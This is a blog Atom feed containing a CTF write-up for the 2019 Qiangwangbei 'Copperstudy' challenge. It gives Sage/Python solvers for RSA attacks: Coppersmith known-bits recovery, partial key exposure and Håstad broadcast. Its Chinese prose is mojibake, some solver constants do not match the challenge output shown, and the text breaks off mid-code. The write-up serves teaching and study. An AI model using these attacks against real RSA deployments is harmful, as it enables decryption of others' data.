<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0x14&#39;s Blog | çƒ­çˆ±åˆ†äº«</title>
  
  <subtitle>0x14</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2019-05-29T03:03:24.032Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>0x14</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019å¼ºç½‘æ¯_Copperstudy</title>
    <link href="http://www.yof3ng.xyz/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
    <id>http://www.yof3ng.xyz/2019/05/29/2019å¼ºç½‘æ¯-Copperstudy/</id>
    <published>2019-05-29T00:44:33.000Z</published>
    <updated>2019-05-29T03:03:24.032Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€é“RSAè¿‡ä¸€éå„ç§æ”»å‡»ã€‚</p><a id="more"></a><p>[TOC]</p><h1 id="ğŸš©2019å¼ºç½‘æ¯-Copperstudy"><a href="#ğŸš©2019å¼ºç½‘æ¯-Copperstudy" class="headerlink" title="ğŸš©2019å¼ºç½‘æ¯_Copperstudy"></a>ğŸš©2019å¼ºç½‘æ¯_Copperstudy</h1><blockquote><p>ğŸ˜­å¡åœ¨ç¬¬äº”å…³ï¼Œä¸€çœ‹wpå‘ç°å°‘copyäº†ä¸€ä¸ªnï¼Œä»¥ä¸ºæœ‰nå’Œmä¸¤ä¸ªæœªçŸ¥æ•°ï¼ˆps:sageçœŸå¼ºå¤§ï¼‰ã€‚</p></blockquote><h2 id="âœ…Challenge-0"><a href="#âœ…Challenge-0" class="headerlink" title="âœ…Challenge 0"></a>âœ…Challenge 0</h2><p>åªéœ€çˆ†ç ´å¾—å‡ºskrçš„å€¼ï¼Œè¿™æ˜¯é—¨æ§›ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="âœ…Challenge-1"><a href="#âœ…Challenge-1" class="headerlink" title="âœ…Challenge 1"></a>âœ…Challenge 1</h2><p>å¯†æ–‡é«˜ä½å·²çŸ¥ï¼ŒæœªçŸ¥ä½æ¯”ç‰¹æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bitsæœªçŸ¥</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="âœ…Challenge-2"><a href="#âœ…Challenge-2" class="headerlink" title="âœ…Challenge 2"></a>âœ…Challenge 2</h2><p>å·²çŸ¥éƒ¨åˆ†å› æ•°é«˜Bitï¼ŒæœªçŸ¥ä½æ¯”ç‰¹æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="âœ…Challenge-3"><a href="#âœ…Challenge-3" class="headerlink" title="âœ…Challenge 3"></a>âœ…Challenge 3</h2><p>å·²çŸ¥éƒ¨åˆ†ç§é’¥ï¼Œä½†ç§é’¥é«˜æ¯”ç‰¹æœªçŸ¥ï¼ŒPartial Key Exposure Attack(éƒ¨åˆ†ç§é’¥æš´éœ²æ”»å‡»)ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="âœ…Challenge-4"><a href="#âœ…Challenge-4" class="headerlink" title="âœ…Challenge 4"></a>âœ…Challenge 4</h2><p>ç»™å‡ºä¸‰ç»„(n,c)ï¼Œé‡‡ç”¨ä½æŒ‡æ•°å¹¿æ’­æ”»å‡»ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token 